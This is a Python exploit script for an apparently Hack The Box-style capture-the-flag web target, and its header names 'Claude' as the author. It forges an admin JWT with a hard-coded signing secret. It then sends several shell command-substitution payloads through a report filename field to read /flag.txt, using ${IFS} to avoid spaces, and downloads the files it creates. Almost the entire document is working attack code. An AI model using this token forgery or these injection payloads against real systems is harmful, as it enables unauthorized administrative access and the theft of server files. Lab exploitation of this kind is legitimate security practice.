#!/usr/bin/env python3
"""
Inject flag content directly into SQLite output
Author: Claude
Purpose: Use command substitution to embed flag in output
Created: 2025-11-20 (Session 5)
Expected: Flag appears in the generated report file
"""

import requests
import jwt
import datetime
import time

BASE_URL = "http://154.57.164.73:32397"
JWT_SECRET = "ayame_moonlight_gekko_secret_key_for_jwt_signing_do_not_use_in_production_2024"

def create_admin_token():
    payload = {
        "sub": "999",
        "username": "admin_exploit",
        "role": "admin",
        "email": "admin@test.com",
        "iat": int(datetime.datetime.now().timestamp()),
        "exp": int((datetime.datetime.now() + datetime.timedelta(hours=2)).timestamp()),
        "jti": "exploit-admin-session5"
    }
    return jwt.encode(payload, JWT_SECRET, algorithm="HS256")

admin_token = create_admin_token()
headers_admin = {
    "Authorization": f"Bearer {admin_token}",
    "Content-Type": "application/json"
}

print("Attempting to inject flag content into output filename:")
print("=" * 60)

# The command is:  sqlite3 "prisma/dev.db" ".mode line" ".output /tmp/reports/FILENAME" "QUERY"
# If we use: FILENAME = `cat /flag.txt`.txt
# Then the command becomes: .output /tmp/reports/`cat /flag.txt`.txt
# Which should create a file named with the flag content!

test_filenames = [
    # Command substitution - the filename will be the flag content
    "`cat${IFS}/flag.txt`.txt",

    # Alternative syntax
    "$(cat${IFS}/flag.txt).txt",

    # Try to write flag to a file in /tmp/reports (which we have access to)
    "`cat${IFS}/flag.txt${IFS}>/tmp/reports/THEFLAG.txt`.txt",

    # Or try to append
    "`cat${IFS}/flag.txt${IFS}>>/tmp/reports/THEFLAG2.txt`.txt",

    # Try reading and creating with tee
    "`cat${IFS}/flag.txt${IFS}|${IFS}tee${IFS}/tmp/reports/THEFLAG3.txt`.txt",

    # Try to embed in a known filename
    "`cat${IFS}/flag.txt${IFS}|${IFS}head${IFS}-1`.txt",
]

for i, filename in enumerate(test_filenames):
    print(f"\n[{i+1}] Filename: {filename[:60]}")

    r = requests.post(f"{BASE_URL}/api/admin/reports", headers=headers_admin, json={
        "reportType": "user_activity",
        "format": "txt",
        "filename": filename
    })

    print(f"Status: {r.status_code}")

    if r.status_code == 200:
        resp_data = r.json()
        print(f"Success: {resp_data.get('success')}")
        print(f"Output: {resp_data.get('output', 'N/A')[:200]}")
    else:
        print(f"Error: {r.text[:150]}")

time.sleep(2)

# List all files
print("\n" + "=" * 60)
print("Listing all files:")
print("=" * 60)

r = requests.get(f"{BASE_URL}/api/admin/files", headers=headers_admin)
if r.status_code == 200:
    files = r.json().get('entries', [])
    print(f"Total files: {len(files)}")

    # Show all files, especially looking for unusual names (the flag!)
    print("\nAll files (sorted by name):")
    for f in sorted(files, key=lambda x: x['name']):
        print(f"  {f['name']} ({f['size']} bytes)")

# Try to download potentially flag-named files
print("\n" + "=" * 60)
print("Downloading suspicious files:")
print("=" * 60)

suspicious_files = ["THEFLAG.txt", "THEFLAG2.txt", "THEFLAG3.txt"]

# Also add any files that look like they might contain the flag (HTB format)
r = requests.get(f"{BASE_URL}/api/admin/files", headers=headers_admin)
if r.status_code == 200:
    all_files = r.json().get('entries', [])
    for f in all_files:
        if 'HTB{' in f['name'] or 'FLAG' in f['name'].upper() or f['name'].startswith('.txt'):
            suspicious_files.append(f['name'])

for filename in set(suspicious_files):
    r = requests.get(f"{BASE_URL}/api/admin/files", headers=headers_admin,
                     params={"filename": filename})

    if r.status_code == 200:
        print(f"\nğŸ“ {filename}:")
        print("-" * 60)
        print(r.text)
        print("-" * 60)

        # Check if it contains HTB{
        if 'HTB{' in r.text:
            print(f"\nğŸ‰ğŸ‰ğŸ‰ FLAG FOUND IN {filename}! ğŸ‰ğŸ‰ğŸ‰")
            print(r.text)
